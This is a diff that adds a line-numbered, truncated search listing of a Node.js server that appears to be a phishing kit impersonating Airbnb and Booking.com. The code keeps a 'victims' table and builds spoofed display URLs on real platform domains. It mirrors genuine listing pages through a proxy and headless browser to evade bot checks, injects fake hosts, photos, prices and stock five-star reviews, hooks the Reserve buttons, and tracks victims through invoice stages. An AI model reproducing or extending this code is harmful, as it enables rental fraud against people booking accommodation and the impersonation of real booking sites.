@@ -1,0 +1,1038 @@
+﻿
+LineNumber Line                                                                                                        
+---------- ----                                                                                                        
+        48 const listingUpload = upload.fields([                                                                       
+        50   { name: 'host_photo', maxCount: 1 },                                                                      
+        83     CREATE TABLE IF NOT EXISTS listings (                                                                   
+        98       amenities TEXT,                                                                                       
+        99       host_name TEXT,                                                                                       
+       102       property_type TEXT DEFAULT 'Entire apartment',                                                        
+       110       listing_id INTEGER,                                                                                   
+       122       FOREIGN KEY (listing_id) REFERENCES listings(id),                                                     
+       171   const cols = db.prepare("PRAGMA table_info(listings)").all().map(c => c.name);                            
+       174       try { db.exec(`ALTER TABLE listings ADD COLUMN ${name} ${def}`); } catch (e) {}                       
+       182   add('amenities', 'TEXT');                                                                                 
+       183   add('host_name', 'TEXT');                                                                                 
+       184   add('host_photo', 'TEXT');                                                                                
+       188   add('property_type', "TEXT DEFAULT 'Entire apartment'");                                                  
+       191   add('listing_code', 'TEXT');                                                                              
+       198   add('apartment_id', 'INTEGER');                                                                           
+       205   add('booking_status', "TEXT DEFAULT 'not_opened'");                                                       
+       208   add('clone_listing_id', 'TEXT');                                                                          
+       209   try { db.exec('CREATE UNIQUE INDEX IF NOT EXISTS idx_listings_public_path ON listings(public_path)'); }...
+       210   try { db.exec('CREATE UNIQUE INDEX IF NOT EXISTS idx_listings_code ON listings(listing_code)'); } catch...
+       236   db.exec(`CREATE TABLE IF NOT EXISTS apartments (                                                          
+       252     amenities TEXT,                                                                                         
+       253     host_name TEXT,                                                                                         
+       254     host_photo TEXT,                                                                                        
+       257     property_type TEXT DEFAULT 'Entire apartment',                                                          
+       269   try { db.exec("UPDATE listings SET booking_status = 'not_opened' WHERE booking_status IS NULL OR bookin...
+       270   add('host_id', 'INTEGER');                                                                                
+       271   db.exec(`CREATE TABLE IF NOT EXISTS hosts (                                                               
+       276     is_superhost INTEGER DEFAULT 1,                                                                         
+       363     hostedBy: 'Hébergé par', superhost: 'Superhost', yearsHosting: 'ans d\'hébergement',                    
+       386     superhostDesc: 'Les Superhosts sont des hôtes expérimentés et très bien notés.',                        
+       389     offerAmenity: 'Ce que propose ce logement'                                                              
+       394     hostedBy: 'Anfitrión', superhost: 'Superanfitrión', yearsHosting: 'años como anfitrión',                
+       417     superhostDesc: 'Los Superanfitriones tienen experiencia y valoraciones excelentes.',                    
+       420     offerAmenity: 'Lo que ofrece este lugar'                                                                
+       425     hostedBy: 'Hosted by', superhost: 'Superhost', yearsHosting: 'years hosting',                           
+       441     requestSent: 'Request sent', requestSub: 'Your reservation is being reviewed.',                         
+       448     superhostDesc: 'Superhosts are experienced, highly rated Hosts.',                                       
+       451     offerAmenity: 'What this place offers'                                                                  
+       494     'Absolutely stunning apartment! The views were breathtaking and the location was perfect for explorin...
+       495     'Great host, very responsive and helpful. The apartment was spotless and exactly as described. Would ...
+       497     'Perfect location, walking distance to everything. The host thought of every little detail. One of th...
+       498     'Amazing stay! The apartment is even better than the photos. Clean, modern, and in a wonderful neighb...
+       499     'Host was incredibly accommodating. The check-in was seamless and the apartment had all amenities we ...
+       501     'Exceptional property with a fantastic host. Every detail was carefully thought out. Made our trip tr...
+       525 function generateReviews(listing) {                                                                         
+       526   const raw = listing.reviews_json || '';                                                                   
+       531   const locale = listing.locale || 'en';                                                                    
+       532   const count = Math.min(parseInt(listing.reviews) || 8, 100);                                              
+       577 const BOOKING_STATUSES = [                                                                                  
+       581   { id: 'invoice_sent', label: 'Invoice', color: '#3b82f6', bg: '#0c1a33' },                                
+       590   invoice_sent: 3,                                                                                          
+       595 function advanceListingStatus(listingOrId, nextStatus, opts) {                                              
+       598     let listing = listingOrId;                                                                              
+       599     if (listing == null) return false;                                                                      
+       600     if (typeof listing !== 'object') {                                                                      
+       601       listing = db.prepare('SELECT id, user_id, booking_status FROM listings WHERE id = ?').get(listing);   
+       603     if (!listing || !listing.id) return false;                                                              
+       604     const allowed = BOOKING_STATUSES.map(s => s.id);                                                        
+       606     const cur = listing.booking_status || 'not_opened';                                                     
+       612     db.prepare("UPDATE listings SET booking_status = ?, status_updated_at = datetime('now'), opened_at = ...
+       613       .run(nextStatus, nextStatus, listing.id);                                                             
+       614     listing.booking_status = nextStatus;                                                                    
+       616       io.emit('listing_status', { id: listing.id, booking_status: nextStatus, userId: listing.user_id });   
+       617       try { io.to('user:' + listing.user_id).emit('listing_status', { id: listing.id, booking_status: nex...
+       621     console.error('advanceListingStatus', e);                                                               
+       626 function listingFromVictimId(victimId) {                                                                    
+       628     const v = db.prepare('SELECT listing_id, user_id FROM victims WHERE id = ?').get(victimId);             
+       629     if (!v || !v.listing_id) return null;                                                                   
+       630     return db.prepare('SELECT id, user_id, booking_status FROM listings WHERE id = ?').get(v.listing_id);   
+       634 function bookingStatusMeta(id) {                                                                            
+       635   return BOOKING_STATUSES.find(s => s.id === id) || BOOKING_STATUSES[0];                                    
+       663 function markListingOpened(listing) {                                                                       
+       665     if (!listing || !listing.id) return;                                                                    
+       666     const cur = listing.booking_status || 'not_opened';                                                     
+       668       db.prepare("UPDATE listings SET booking_status = 'open', opened_at = COALESCE(opened_at, datetime('...
+       669       listing.booking_status = 'open';                                                                      
+       671         io.emit('listing_status', { id: listing.id, booking_status: 'open', userId: listing.user_id });     
+       672         io.emit('live_presence', { listingId: listing.id, userId: listing.user_id, event: 'opened', at: n...
+       673         try { io.to('user:' + listing.user_id).emit('live_presence', { listingId: listing.id, userId: lis...
+       679 function apartmentToListingFields(apt) {                                                                    
+       694     amenities: apt.amenities || '',                                                                         
+       695     host_name: apt.host_name || '',                                                                         
+       696     host_photo: apt.host_photo || '',                                                                       
+       699     property_type: apt.property_type || 'Entire apartment',                                                 
+       710 const AMENITY_LIST = [                                                                                      
+       721     { host: 'www.airbnb.com', pathPrefix: '/rooms/', label: 'airbnb.com' },                                 
+       722     { host: 'www.airbnb.co.uk', pathPrefix: '/rooms/', label: 'airbnb.co.uk' },                             
+       723     { host: 'www.airbnb.fr', pathPrefix: '/rooms/', label: 'airbnb.fr' },                                   
+       724     { host: 'www.airbnb.de', pathPrefix: '/rooms/', label: 'airbnb.de' },                                   
+       725     { host: 'www.airbnb.es', pathPrefix: '/rooms/', label: 'airbnb.es' },                                   
+       726     { host: 'www.airbnb.it', pathPrefix: '/rooms/', label: 'airbnb.it' },                                   
+       727     { host: 'www.airbnb.com.au', pathPrefix: '/rooms/', label: 'airbnb.com.au' },                           
+       728     { host: 'www.airbnb.ca', pathPrefix: '/rooms/', label: 'airbnb.ca' },                                   
+       729     { host: 'www.airbnb.co.jp', pathPrefix: '/rooms/', label: 'airbnb.co.jp' },                             
+       730     { host: 'www.airbnb.com.br', pathPrefix: '/rooms/', label: 'airbnb.com.br' }                            
+       732   booking: [                                                                                                
+       733     { host: 'www.booking.com', pathPrefix: '/hotel/', label: 'booking.com' },                               
+       734     { host: 'www.booking.co.uk', pathPrefix: '/hotel/', label: 'booking.co.uk' },                           
+       735     { host: 'www.booking.fr', pathPrefix: '/hotel/', label: 'booking.fr' },                                 
+       736     { host: 'www.booking.de', pathPrefix: '/hotel/', label: 'booking.de' },                                 
+       737     { host: 'www.booking.es', pathPrefix: '/hotel/', label: 'booking.es' },                                 
+       738     { host: 'www.booking.it', pathPrefix: '/hotel/', label: 'booking.it' }                                  
+       751 function bookingSlugFromTitle(title, location) {                                                            
+       760 function randomListingCode(marketplace, title, location) {                                                  
+       761   if (marketplace === 'booking') {                                                                          
+       762     return bookingSlugFromTitle(title, location);                                                           
+       771   if (marketplace === 'booking') {                                                                          
+       786   booking: {                                                                                                
+       787     gb: 'www.booking.co.uk', uk: 'www.booking.co.uk', en: 'www.booking.co.uk',                              
+       788     fr: 'www.booking.fr', de: 'www.booking.de', es: 'www.booking.es', it: 'www.booking.it',                 
+       789     us: 'www.booking.com', pt: 'www.booking.com', ro: 'www.booking.com',                                    
+       790     nl: 'www.booking.com', au: 'www.booking.com', br: 'www.booking.com', jp: 'www.booking.com'              
+       796   return list.find(d => d.host === displayDomain || d.label === displayDomain) || list[0];                  
+       800   const mp = marketplace === 'booking' ? 'booking' : 'airbnb';                                              
+       802     return resolveDomainMeta(mp, String(explicit).trim()).host;                                             
+       806   const host = map[loc] || (mp === 'booking' ? 'www.booking.com' : 'www.airbnb.com');                       
+       807   return resolveDomainMeta(mp, host).host;                                                                  
+       810 // Lab patch: build links from the actual request host so they work                                         
+       811 // via any tunnel (or localhost) without restarting with a new BASE_URL.                                    
+       815   return proto + '://' + req.get('host');                                                                   
+       818 /** Site origin (scheme://host, no trailing slash) for the current request. */                              
+       823 function livePhishUrl(listing, req) {                                                                       
+       824   const p = listing.public_path || ('/listing/' + listing.id);                                              
+       829 // (derived from the listing id so the link stays stable between page loads).                               
+       830 function demoStayParams(listing) {                                                                          
+       831   const mp = listing.marketplace === 'booking' ? 'booking' : 'airbnb';                                      
+       832   const seed = Number(listing.id) || 1;                                                                     
+       833   let base = Date.parse(listing.created_at);                                                                
+       840   if (mp === 'booking') {                                                                                   
+       846 function spoofDisplayUrl(listing) {                                                                         
+       847   const mp = listing.marketplace === 'booking' ? 'booking' : 'airbnb';                                      
+       848   const meta = resolveDomainMeta(mp, listing.display_domain);                                               
+       849   const code = listing.listing_code || String(listing.id);                                                  
+       850   const path = listing.public_path || buildPublicPath(mp, code);                                            
+       851   return 'https://' + meta.host + path + demoStayParams(listing);                                           
+       854 function findListingByParam(param) {                                                                        
+       855   let listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (public_path = ? OR public...
+       861   if (!listing && /^\d+$/.test(String(param))) {                                                            
+       862     listing = db.prepare("SELECT * FROM listings WHERE id = ? AND status = 'active'").get(param);           
+       864   if (!listing) {                                                                                           
+       867       listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR publi...
+       872   return listing || null;                                                                                   
+       876 function getListingVideo(listing) {                                                                         
+       877   return (listing && listing.video_url) ? String(listing.video_url).trim() : '';                            
+       886     return '<div class="' + (cls||'mf-video') + '"><iframe src="https://www.youtube.com/embed/' + yt + '"...
+       894 // Full MITM-style mirror of Airbnb / Booking listing pages.                                                
+       901 const PROXY_SESS = new Map(); // sid -> { listingId, origin, jar: Map, ua }                                 
+       903 const ORIGIN_HOST_RE =                                                                                      
+       904   /(?:^|\.)(?:airbnb\.[a-z.]+|booking\.com|bstatic\.com|muscache\.com|jsdelivr\.net|cloudflare\.com|googl...
+       906 function hostAllowed(host) {                                                                                
+       907   if (!host) return false;                                                                                  
+       908   const h = String(host).toLowerCase().split(':')[0];                                                       
+       909   if (ORIGIN_HOST_RE.test(h)) return true;                                                                  
+       910   if (h.includes('airbnb') || h.includes('muscache') || h.includes('booking') || h.includes('bstatic')) r...
+       962       'Referer': opts.referer || (parsed.protocol + '//' + parsed.host + '/'),                              
+       970         hostname: parsed.hostname,                                                                          
+       981           if (!loc.startsWith('http')) loc = parsed.protocol + '//' + parsed.host + loc;                    
+      1029 /** Fully hydrate Airbnb/Booking listing HTML via headless Chrome (bypasses bot shell). */                  
+      1092 /** True when HTML looks like a fully painted listing (browser snapshot). */                                
+      1108     title.includes('apartments for rent - airbnb') ||                                                       
+      1109     (/^airbnb\s*[:\-–]/.test(title) && !/\d{5,}/.test(title) && !title.includes(' - apartments') && !titl...
+      1111   // Real PDPs have a specific listing title, not the generic brand homepage                                
+      1112   const surface = listingPageSurfaceText(s);                                                                
+      1120     /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surface);                              
+      1124 function isHydratedListingHtml(html, targetUrl) {                                                           
+      1129   if (isOriginListingMissing(s, 200) || isBotPage(s)) return false;                                         
+      1132   const surface = listingPageSurfaceText(s);                                                                
+      1137     /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surface),                              
+      1139     surface.includes('hosted by') || surface.includes('hébergé par') || surface.includes('anfitrión:'),     
+      1142   // Booking                                                                                                
+      1143   if (/booking\.com/i.test(String(targetUrl || '')) && s.length > 80000 && !isAirbnbHomepageShell(s)) ret...
+      1169   const surface = listingPageSurfaceText(s);                                                                
+      1181 function listingPageSurfaceText(html) {                                                                     
+      1195 /** True when upstream listing does not exist (do NOT mirror Oops page). */                                 
+      1196 function isOriginListingMissing(html, status) {                                                             
+      1201   // Tiny HTML is almost never a real listing                                                               
+      1203   // SPA marketing homepage shell = missing listing (dead room IDs)                                         
+      1207   const surfaceEarly = listingPageSurfaceText(s);                                                           
+      1212       /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surfaceEarly))                       
+      1230  * Require evidence the listing payload is actually present.                                                
+      1232 function isValidProxiedListingHtml(html, targetUrl) {                                                       
+      1236   if (isOriginListingMissing(s, 200) || isBotPage(s)) return false;                                         
+      1240   let isBooking = false;                                                                                    
+      1243     isAirbnb = /airbnb\./i.test(u.hostname);                                                                
+      1244     isBooking = /booking\.com/i.test(u.hostname);                                                           
+      1253     const surface = listingPageSurfaceText(s);                                                              
+      1264       title.includes('apartments for rent - airbnb') ||                                                     
+      1265       (/^airbnb\s*[:\-–]/.test(title) && !title.includes(roomId) && !/ for rent in | - apartments| · /.te...
+      1269     // Require real PDP surface OR strong bootstrap listing payload                                         
+      1273       /entire (rental|home|condo|loft|place|serviced|apartment)/i.test(surface) ||                          
+      1274       surface.includes('hosted by');                                                                        
+      1275     const hasListingPayload =                                                                               
+      1276       s.includes('"listingId":' + roomId) ||                                                                
+      1277       s.includes('"listingId":"' + roomId + '"') ||                                                         
+      1278       s.includes('"listing_id":"' + roomId + '"') ||                                                        
+      1280     if (hasPdpSurface || hasListingPayload) return true;                                                    
+      1284   if (isBooking && roomId) {                                                                                
+      1303 function absoluteListingAsset(url, req) {                                                                   
+      1313 function buildListingInjectPayload(listing, req) {                                                          
+      1314   const imgs = parseListingImages(listing).map((u) => absoluteListingAsset(u, req)).filter(Boolean);        
+      1316   const locale = listing.locale || 'en';                                                                    
+      1318   const currency = listing.currency || localeInfo.currency || 'EUR';                                        
+      1321   const priceNight = parseFloat(listing.price) || 0;                                                        
+      1322   const priceMonth = parseFloat(listing.price_month) || (priceNight ? Math.round(priceNight * 28) : 0);     
+      1323   const hideNightly = Number(listing.hide_nightly) === 1;                                                   
+      1325     title: listing.title || 'Apartment',                                                                    
+      1326     loc: listing.location || '',                                                                            
+      1327     desc: listing.description || '',                                                                        
+      1328     host: listing.host_name || 'Host',                                                                      
+      1329     hostPhoto: absoluteListingAsset(listing.host_photo || '', req),                                         
+      1331     ptype: listing.property_type || 'Entire rental unit',                                                   
+      1332     guests: listing.guests || 4,                                                                            
+      1333     bedrooms: listing.bedrooms || 1,                                                                        
+      1334     beds: listing.beds || listing.bedrooms || 1,                                                            
+      1335     baths: listing.baths || 1,                                                                              
+      1336     rating: parseFloat(listing.rating) || 4.92,                                                             
+      1337     reviews: parseInt(listing.reviews, 10) || 48,                                                           
+      1399 /** Map / calendar / sticky booking helpers on frozen offline shell (no SPA). */                            
+      1428 function enhanceOfflineListingShell(html, listing, req) {                                                   
+      1430   const p = buildListingInjectPayload(listing, req);                                                        
+      1431   const locQ = encodeURIComponent(p.loc || listing.location || 'London');                                   
+      1436   // Hide donor book-it chrome so only our sticky booking card shows (offline shell skips freezeDonorSpa)   
+      1440       '[data-testid="book-it-default"],[data-testid="book-it-sidebar"],[data-section-id="BOOK_IT_SIDEBAR"...
+      1441       '#mf-booking-card{display:block!important;visibility:visible!important;height:auto!important;max-he...
+      1457     const whereRe = /Where you['’]ll be[\s\S]{0,800}?Exact location provided after booking/i;               
+      1495   // ─── Airbnb-style Booking Card (sticky sidebar clone) ───                                               
+      1499   const maxGuests = Math.max(1, Math.min(16, parseInt(listing.guests, 10) || 4));                           
+      1502     '<div id="mf-booking-card" style="position:sticky;top:24px;z-index:10;background:#fff;border:1px soli...
+      1727     '  // Bridge: Airbnb native day-grid → mf-cal-in/out + booking card labels\n' +                         
+      1806     '      if(t.closest("#mf-booking-card,#mf-offline-cal,#mf-proxy-overlay,#mf-book-dates,#mf-guests-pop...
+      1837     '  // Booking card date buttons: scroll to main calendar instead of broken native picker\n' +           
+      1849     '  document.querySelectorAll("#mf-booking-card button,[data-mf-bi]").forEach(function(el){\n' +         
+      1868 function wrapOfflineCapture(html, listingId, victimId, req) {                                               
+      1883     s = rewriteProxyHtml(s, MF_DONOR_URL, listingId, reqOrigin(req), victimId, req);                        
+      1895 async function buildOfflineAirbnbListingPage(listing, victimId, req) {                                      
+      1904   let html = injectListingContentIntoDonorHtml(shell, listing, req);                                        
+      1905   html = enhanceOfflineListingShell(html, listing, req);                                                    
+      1906   html = wrapOfflineCapture(html, listing.id, victimId, req);                                               
+      1916     if (/mf-listing-inject|mf-proxy|__MF_/i.test(a + body)) return all;                                     
+      1936     '<style id="mf-donor-chrome">[data-testid="modal-container"],[data-testid="cookie-banner"],[data-test...
+      1981 function injectListingContentIntoDonorHtml(html, listing, req) {                                            
+      1982   const p = buildListingInjectPayload(listing, req);                                                        
+      1988     '<title>' + esc(p.title) + (p.loc ? ' - Apartments for Rent in ' + esc(p.loc) : '') + ' | Airbnb</tit...
+      1991     /(<meta[^>]+property=["']og:title["'][^>]*content=)(["'])[^"']*\2/i,                                    
+      1995     /(<meta[^>]+content=)(["'])[^"']*\2([^>]+property=["']og:title["'])/i,                                  
+      2000       /(<meta[^>]+property=["']og:image["'][^>]*content=)(["'])[^"']*\2/i,                                  
+      2025   s = s.replace(/Hosted by [^<]{1,60}/g, 'Hosted by ' + esc(p.host));                                       
+      2027     s = s.replace(/Entire (?:rental unit|condo|home|loft|place|apartment|serviced apartment|flat) in [^<]...
+      2032     s = s.replace(/Entire (rental unit|condo|home|loft|place|apartment|serviced apartment|flat)/gi, () =>...
+      2035   // Donor host leftovers (Paris Yvon shell + UK Sophie shell)                                              
+      2036   const hostEsc = esc(p.host);                                                                              
+      2037   s = s.replace(/\bYvon\b/g, hostEsc);                                                                      
+      2038   s = s.replace(/\bSophie\b/g, hostEsc);                                                                    
+      2039   s = s.replace(/(?:Yvon|Sophie) is a Superhost/gi, hostEsc + ' is a Superhost');                           
+      2040   s = s.replace(/Learn more about the host,\s*(?:Yvon|Sophie)/gi, 'Learn more about the host, ' + hostEsc); 
+      2041   s = s.replace(/aria-label="Learn more about the host,\s*(?:Yvon|Sophie)\."/gi, 'aria-label="Learn more ...
+      2050     s = s.replace(/Flats for Rent in West Midlands/gi, 'Apartments for Rent in ' + locEsc);                 
+      2051     s = s.replace(/Apartments for Rent in West Midlands/gi, 'Apartments for Rent in ' + locEsc);            
+      2074     '\n<script id="mf-listing-inject">\n' +                                                                 
+      2123     '      document.title=P.title+(P.loc?(" - Apartments for Rent in "+P.loc):"")+" | Airbnb";\n' +         
+      2126     '  function replaceHost(){\n' +                                                                         
+      2131     '        if(/Hosted by\\s+\\S+/i.test(t)) n.nodeValue=t.replace(/Hosted by\\s+[^\\n]+/i,"Hosted by "+...
+      2132     '        if(/\\b(?:Yvon|Sophie)\\b/i.test(t)) n.nodeValue=t.replace(/\\b(?:Yvon|Sophie)\\b/gi, P.host...
+      2134     '      if(P.hostPhoto){\n' +                                                                            
+      2135     '        var hostSec=lastSec("HOST_OVERVIEW_DEFAULT")||lastSec("MEET_YOUR_HOST")||lastSec("HOST_PROFI...
+      2136     '        if(hostSec){\n' +                                                                              
+      2137     '          var himg=hostSec.querySelectorAll("img");\n' +                                               
+      2138     '          for(var i=0;i<himg.length;i++){ try{ himg[i].src=P.hostPhoto; himg[i].srcset=P.hostPhoto; ...
+      2140     '        var avatars=document.querySelectorAll(\'img[data-testid="host-profile-image"], img[alt*="Yvo...
+      2141     '        for(var j=0;j<avatars.length;j++){ try{ avatars[j].src=P.hostPhoto; avatars[j].srcset=P.host...
+      2200     '        if(/\\b(?:Yvon|Sophie)\\b/i.test(t)) n.nodeValue=t.replace(/\\b(?:Yvon|Sophie)\\b/gi, P.host...
+      2241     '        if(/\\b(?:Yvon|Sophie)\\b/i.test(next)) next=next.replace(/\\b(?:Yvon|Sophie)\\b/gi, P.host)...
+      2294     '  function run(){ replaceImgs(); replaceTitle(); replaceHost(); replacePrice(); replaceDesc(); repla...
+      2306 async function staticListingFallback(listing, victimId, req) {                                              
+      2308     if (listing && listing.marketplace === 'booking') return bookingPage(listing, victimId);                
+      2309     return airbnbPage(listing, victimId);                                                                   
+      2311     console.error('staticListingFallback', e);                                                              
+      2312     return clientProxyFallback(listing, victimId, buildProxyTargetUrl(listing) || '', req);                 
+      2316 function buildProxyTargetUrl(listing) {                                                                     
+      2317   const explicit = (listing.proxy_target_url || '').trim();                                                 
+      2319   const mp = listing.marketplace === 'booking' ? 'booking' : 'airbnb';                                      
+      2320   const code = (listing.listing_code || '').trim();                                                         
+      2321   let host = (listing.display_domain || '').trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '');        
+      2322   if (!host) host = mp === 'booking' ? 'www.booking.com' : 'www.airbnb.com';                                
+      2323   if (mp === 'booking') {                                                                                   
+      2324     const pathPart = (listing.public_path || '').replace(/^\//, '') || (code ? 'hotel/' + code + '.en-gb....
+      2325     if (explicit && !explicit.startsWith('http')) return 'https://' + host + '/' + explicit.replace(/^\//...
+      2326     return 'https://' + host + '/' + pathPart.replace(/^\//, '');                                           
+      2329   return 'https://' + host + '/rooms/' + code;                                                              
+      2356  *  Absolute: {BASE}/_mfpx/{id}/u/{s|p}/{hostname}{pathname}{search}{hash}                                  
+      2358 function encodeHierarchicalMfpx(listingId, absoluteUrl, req) {                                              
+      2362   const host = u.hostname + (u.port ? ':' + u.port : '');                                                   
+      2366   return mfpxSiteOrigin(req) + '/_mfpx/' + listingId + '/u/' + scheme + '/' + host + pathname + (u.search...
+      2375   // Hierarchical: /_mfpx/:id/u/s|p/hostname/path...                                                        
+      2378     const listingId = parseInt(m[1], 10);                                                                   
+      2380     const host = m[3];                                                                                      
+      2384     let targetUrl = scheme + '://' + host + pathname;                                                       
+      2386     return { listingId, targetUrl };                                                                        
+      2393       listingId: parseInt(m[1], 10),                                                                        
+      2403       return { listingId: parseInt(m[1], 10), targetUrl: decodeProxiedUrl(m[2]) };                          
+      2416   /https?:\/\/(?:[a-z0-9-]+\.)*(?:airbnb\.[a-z.]+|muscache\.com|booking\.com|bstatic\.com)(?:\/[^\"'\\`\s...
+      2418   /\/\/(?:[a-z0-9-]+\.)*(?:airbnb\.[a-z.]+|muscache\.com|booking\.com|bstatic\.com)(?:\/[^\"'\\`\s<>\)\]\...
+      2420 function rewriteAbsUrlMatch(abs, listingId, req) {                                                          
+      2424     return mfpxUrl(listingId, clean, req) + suffix;                                                         
+      2430 function rewriteOriginUrlsInText(text, listingId, req) {                                                    
+      2432   out = out.replace(PROXY_ABS_URL_RE, (abs) => rewriteAbsUrlMatch(abs, listingId, req));                    
+      2435       return rewriteAbsUrlMatch('https:' + abs, listingId, req);                                            
+      2443 function mfpxUrl(listingId, absoluteUrl, req) {                                                             
+      2447     if (!hostAllowed(u.hostname) && !u.hostname.includes('airbnb') && !u.hostname.includes('booking') && ...
+      2450     const hier = encodeHierarchicalMfpx(listingId, u.href, req);                                            
+      2457 /** Pull listing_code + public_path + host from a real Airbnb/Booking URL */                                
+      2459   const out = { code: '', publicPath: '', host: '', marketplace: marketplace || 'airbnb' };                 
+      2463     out.host = u.hostname.toLowerCase();                                                                    
+      2464     if (out.host.includes('booking') || marketplace === 'booking') {                                        
+      2465       out.marketplace = 'booking';                                                                          
+      2483 function rewriteProxyHtml(html, targetUrl, listingId, baseUrl, victimId, req) {                             
+      2485   const origin = parsed.protocol + '//' + parsed.host;                                                      
+      2501       jsonHolders.push(rewriteOriginUrlsInText(body, listingId, req));                                      
+      2506   // Full absolute URL rewrite for allowed hosts (complete paths, not truncated)                            
+      2507   s = rewriteOriginUrlsInText(s, listingId, req);                                                           
+      2518         return attr + '=' + q + mfpxUrl(listingId, origin + pathRel, req) + q;                              
+      2533           u = mfpxUrl(listingId, origin + u, req);                                                          
+      2535           u = rewriteAbsUrlMatch(u, listingId, req);                                                        
+      2543   // Base must stay on OUR domain so residual relative URLs don't leak to Airbnb/Booking                    
+      2556       if (hostAllowed(u.hostname)) {                                                                        
+      2557         return '<form' + attrs + 'action=' + q + mfpxUrl(listingId, act, req) + q;                          
+      2608   var LID = ${JSON.stringify(String(listingId))};                                                           
+      2610   var PUBLIC_PATH = ${JSON.stringify((function(){ try { var L = db.prepare('SELECT public_path, listing_c...
+      2611   window.__MF_LISTING = LID;                                                                                
+      2721         var isShare=/^share$/.test(txt)||/\bshare\b/.test(aria)||/share this|share listing/i.test(aria+txt);
+      2753   // Hook "Reserve" / CTA buttons on real Airbnb/Booking page (incl. loading CTA)                           
+      2832       listing_id: LID,                                                                                      
+      2876         body.innerHTML='<div style="text-align:center;padding:16px 0"><div style="font-size:56px">✅</div>...
+      2883   // {SITE}/_mfpx/{id}/u/{s|p}/{host}{path}{search}{hash}                                                   
+      2885   var ORIGINS = ${JSON.stringify([origin, 'https://www.airbnb.com', 'https://www.airbnb.co.uk', 'https://...
+      2911       if(/^https?:\\/\\/[^/]*(airbnb|muscache|booking|bstatic)/i.test(u)){                                  
+      2943 function clientProxyFallback(listing, vid, targetUrl, req) {                                                
+      2944   const title = esc(listing.title || 'Listing');                                                            
+      2947       const a = listing.images ? JSON.parse(listing.images) : [];                                           
+      2950       return listing.image_url ? [listing.image_url] : [];                                                  
+      2953   const hero = imgs[0] || listing.image_url || '';                                                          
+      2955     listing.currency === 'GBP' ? '£' : listing.currency === 'USD' ? '$' : listing.currency === 'RON' ? 'l...
+      2977   <div class="sub">${esc(listing.location || '')} · ★ ${esc(listing.rating || '4.92')} · ${esc(String(lis...
+      2981       <h2 style="font-size:22px;margin:0 0 8px">${esc(listing.property_type || 'Entire place')} hosted by...
+      2982       <p style="color:#717171">${esc(listing.guests || 2)} guests · ${esc(listing.bedrooms || 1)} bedroom...
+      2984       <p style="line-height:1.6;white-space:pre-wrap">${esc(listing.description || '')}</p>                 
+      2987       <div class="price">${cur}${esc(listing.price || '—')} <span style="font-size:16px;font-weight:400;c...
+      2995   return rewriteProxyHtml(shell, targetUrl || BASE_URL, listing.id, reqOrigin(req), vid, req);              
+      2998 async function getProxiedListingHtml(listing, victimId, req) {                                              
+      2999   let targetUrl = buildProxyTargetUrl(listing);                                                             
+      3001   const cacheKey = listing.id + '|' + targetUrl + '|br|' + reqOrigin(req);                                  
+      3005     const isStaticOk = hitHtml.includes('ab-header') || hitHtml.includes('ab-gallery') || hitHtml.include...
+      3010       !isHydratedListingHtml(hitHtml, hit.target || targetUrl) &&                                           
+      3011       !isValidProxiedListingHtml(hitHtml, hit.target || targetUrl);                                         
+      3013     if (badShell || (isOriginListingMissing(hitHtml, 200) && !isStaticOk && !hit.missing)) {                
+      3036     if (br && br.body && isHydratedListingHtml(br.body, targetUrl)) {                                       
+      3045       isValidProxiedListingHtml(br.body, targetUrl) &&                                                      
+      3046       !isOriginListingMissing(br.body, br.status)                                                           
+      3054       if (br && br.body && (isAirbnbHomepageShell(br.body) || isOriginListingMissing(br.body, br.status))) {
+      3069     const fb = await staticListingFallback(listing, victimId, req);                                         
+      3078   // 2) Fallback: plain fetch (+ alt hosts) — rarely works for Airbnb rooms from DC                         
+      3084       if (isOriginListingMissing(html, result.status) || isBotPage(html) || !isValidProxiedListingHtml(ht...
+      3088           if (u.hostname.includes('airbnb') && /\/rooms\/\d+/i.test(u.pathname)) {                          
+      3090               if (h !== u.hostname) alts.push(u.protocol + '//' + h + u.pathname + u.search);               
+      3097             if (!isOriginListingMissing(r2.body, r2.status) && !isBotPage(r2.body) && isValidProxiedListi...
+      3110   // 3) Still bad — last-chance browser render on alt host                                                  
+      3113     isOriginListingMissing(html, 200) ||                                                                    
+      3115     !(usedBrowser ? isHydratedListingHtml(html, targetUrlFinal) : isValidProxiedListingHtml(html, targetU...
+      3120         const altHosts = u.hostname.includes('airbnb')                                                      
+      3122           : [u.hostname];                                                                                   
+      3123         for (const h of altHosts) {                                                                         
+      3127             if (br2 && br2.body && (isHydratedListingHtml(br2.body, alt) || isValidProxiedListingHtml(br2...
+      3142     isOriginListingMissing(html, 200) ||                                                                    
+      3144     !(usedBrowser ? isHydratedListingHtml(html, targetUrlFinal) || isValidProxiedListingHtml(html, target...
+      3147     const fb = await staticListingFallback(listing, victimId, req);                                         
+      3152   const rewritten = rewriteProxyHtml(html, targetUrlFinal, listing.id, reqOrigin(req), victimId, req);      
+      3169 const AIRBNB_CLONE_URL = process.env.AIRBNB_CLONE_URL || 'http://localhost:3001';                           
+      3175       _mongoClient = new MongoClient('mongodb://localhost:27017/airbnb-clone');                             
+      3182 function listingToCloneDoc(listing) {                                                                       
+      3183   const imgs = parseListingImages(listing);                                                                 
+      3185     title: String(listing.title || 'Beautiful Apartment').slice(0, 120),                                    
+      3186     description: String(listing.description || 'A wonderful place to stay.').slice(0, 1000),                
+      3189     roomCount: Math.max(1, parseInt(listing.bedrooms) || 1),                                                
+      3190     bathroomCount: Math.max(1, parseInt(listing.baths) || 1),                                               
+      3191     guestCount: Math.max(1, parseInt(listing.guests) || 2),                                                 
+      3193     price: Math.max(10, Math.round(parseFloat(listing.price) || 150)),                                      
+      3198 async function syncListingToClone(listing) {                                                                
+      3202     const listingsCol = mdb.collection('Listing');                                                          
+      3206       const r = await usersCol.insertOne({ name: 'Host', email: 'host@stayfinder.com', hashedPassword: '$...
+      3209     const doc = listingToCloneDoc(listing);                                                                 
+      3212     if (listing.clone_listing_id) {                                                                         
+      3213       try { const oid = new ObjectId(listing.clone_listing_id); const ex = await listingsCol.findOne({ _i...
+      3216       const r = await listingsCol.insertOne(doc);                                                           
+      3218       db.prepare('UPDATE listings SET clone_listing_id = ? WHERE id = ?').run(cloneId, listing.id);         
+      3224 async function fetchCloneListingHtml(cloneId) {                                                             
